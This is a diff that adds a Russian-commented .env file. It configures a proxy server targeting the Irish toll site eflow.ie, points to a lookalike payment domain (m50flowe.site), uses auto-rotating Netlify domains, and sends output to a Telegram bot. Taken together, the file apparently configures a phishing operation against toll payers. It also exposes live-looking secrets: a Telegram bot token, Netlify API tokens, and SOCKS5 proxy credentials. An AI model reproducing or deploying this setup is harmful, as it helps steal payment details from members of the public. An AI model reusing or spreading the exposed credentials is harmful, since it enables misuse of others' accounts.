@@ -1,0 +1,75 @@
+# ==========================================
+# ПОЛНАЯ КОНФИГУРАЦИЯ .ENV ФАЙЛА
+# Скопируйте содержимое в файл .env на сервере
+# ==========================================
+
+# ==========================================
+# TELEGRAM BOT CONFIGURATION
+# ==========================================
+TELEGRAM_BOT_TOKEN=8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM
+TELEGRAM_CHAT_ID=-1003622716214
+TELEGRAM_ADMIN_CHAT_ID=-1003622716214
+
+# ==========================================
+# HOSTER API (NETLIFY) CONFIGURATION
+# ==========================================
+HOSTER_API_TOKEN=nfp_Y3zpouopEDAPzZk2f5kqD2fBeT7c6qftef45
+NETLIFY_API_TOKEN=nfp_Y3zpouopEDAPzZk2f5kqD2fBeT7c6qftef45
+
+# ==========================================
+# SERVER CONFIGURATION
+# ==========================================
+SERVER_IP=213.176.79.129
+PORT=3000
+HOST=0.0.0.0
+NODE_ENV=production
+TRUST_PROXY=true
+
+# ==========================================
+# TARGET SERVER CONFIGURATION
+# ==========================================
+TARGET_URL=https://eflow.ie
+PROXY_TIMEOUT=120000
+
+# ==========================================
+# CUSTOM DOMAIN (опционально)
+# Будет автоматически обновляться при смене домена
+# ==========================================
+CUSTOM_DOMAIN=
+
+# ==========================================
+# EXTERNAL PROXY CONFIGURATION (SOCKS5)
+# Установите USE_PROXY=true для включения
+# ==========================================
+USE_PROXY=true
+PROXY_HOST=91.239.213.126
+PROXY_PORT=62743
+PROXY_USERNAME=GXjt8nK3
+PROXY_PASSWORD=ghhPdd4C
+
+# ==========================================
+# PAYMENT SYSTEM CONFIGURATION
+# ==========================================
+PAYMENT_SYSTEM_URL=https://m50flowe.site
+
+# ==========================================
+# LOGGING CONFIGURATION
+# ==========================================
+LOG_LEVEL=info
+LOG_REQUESTS=true
+LOG_RESPONSES=false
+LOG_DIR=./logs
+
+# ==========================================
+# FEATURES CONFIGURATION
+# ==========================================
+ENABLE_COMPRESSION=true
+ENABLE_WEBSOCKET=true
+ENABLE_STATIC=true
+STATIC_DIR=./public
+
+# ==========================================
+# SSL CONFIGURATION
+# Email генерируется автоматически, но можно указать свой
+# ==========================================
+# SSL_EMAIL=your-email@example.com
